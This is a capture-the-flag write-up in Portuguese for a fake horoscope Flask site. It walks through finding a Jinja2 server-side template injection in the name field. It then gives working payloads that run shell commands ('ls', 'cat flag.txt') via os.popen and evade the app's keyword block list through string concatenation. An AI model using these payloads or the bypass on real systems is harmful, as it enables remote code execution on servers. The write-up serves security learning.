# Horoscopus

## Writeup

### 1 ( Identificando a vulnerabilidade )

O site é um horóscopo fake com 3 páginas

#### Home/Início
A página Home/Início é apenas um mostruário dos signos com Lorem Ipsum de descrição que mostram os ranges de dias/meses para cada astral.
Página não possui inputs para testarmos.

#### About/Sobre

Essa é uma página "pra encher linguiça" que mostra "Nossa História", "O que fazemos" e "Nossa Promessa", todas as seções preenchidas com Lorem Ipsum.
Página não possui inputs para testarmos.


#### Horóscopo
Aqui temos uma página formulário onde podemos colocar Nome e Data

A data é um campo rígido do HTML e não possui um método de explorar a vulnerabilidade do ssti por esse.
Ainda assim, temos o campo de usuário:
Testando o famoso input {{6*'7'}} com uma data qualquer, temos um retorno de 777777 no campo do nome gerado no relatório do horóscopo. Ou seja, o campo do nome tem a possibilidade de explorar alguma vulnerabilidade e confirmando a presença do framework Jinja2.


### 2 (Explorando a vulnerabilidade)

Podemos explorar a vulnerabilidade usando keys conhecidas do framework ou do python:

- {{__class__}}
- {{__mro__}}
- {{__subclasses__()}}
- {{config}}
- O famoso payload 
```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```
-    {{url_for.__globals__['current_app']['config'] }}

Testando os possíveis payloads mais famosos temos o retorno da seguinte mensagem ao fazer o envio:

"As forças cósmicas rejeitam suas palavras com energia negativa. Por favor, digite o seu nome novamente."

Isso acontece pois as palavras: "os", "import","popen","subprocess", "system","eval", "exec", "cat", "flag","config" são bloqueadas na nossa aplicação Flask. Ainda assim, é possível fazer o famoso payload, mas com um "pulo do gato" aqui.

### 3 ( Esquivando do bloqueio através de concatenação de strings )

O framework Jinja2 permite a concatenação de strings literais em tempo real utilizando o operador '+'.Além da concatenação de strings, o framework também suporta acesso de dot-notation (class.xxx.xxx) em uma string dinamicamente concatenada. Aliado a tudo isso, temos que __globals__ é, na verdade, um dicionário, o que nos permite acessar seus items da seguinte forma:
```
 __globals__.__builtins__.[__import__]('os')
```
Ainda assim, as no payload acima são bloqueadas. Com isso, juntando a informação dos dicionários, da concatenação de strings e de acesso de propriedades via strings dinamicamente computadas podemos inferir algumas coisas:
- `['__imp'+'ort__']` →  `__import__`
- `('o'+'s')` -> `('os')`
- `['po'+'pen']` → `popen` 
- `('c'+'at fl'+'ag.txt')` → `('cat flag.txt')`
- `['re'+'ad']()` → `.read()`

#### Procurando a flag no diretorio
Usando o payload concatenado:
```
{{ self.__init__.__globals__.__builtins__['__imp'+'ort__']('o'+'s')['po'+'pen']('ls')['re'+'ad']() }}
```
temos o retorno:
"Olá, app.py flag.txt requirements.txt static templates ! Aqui está o seu horóscopo."

Dessa maneira, notamos a presença do arquivo "flag.txt"

#### Printando a flag:

Utilizando o seguinte payload no campo Nome:
```
{{ self.__init__.__globals__.__builtins__['__imp'+'ort__']('o'+'s')['po'+'pen']('c'+'at fl'+'ag.txt')['re'+'ad']() }}
```
nos retornará a flag.
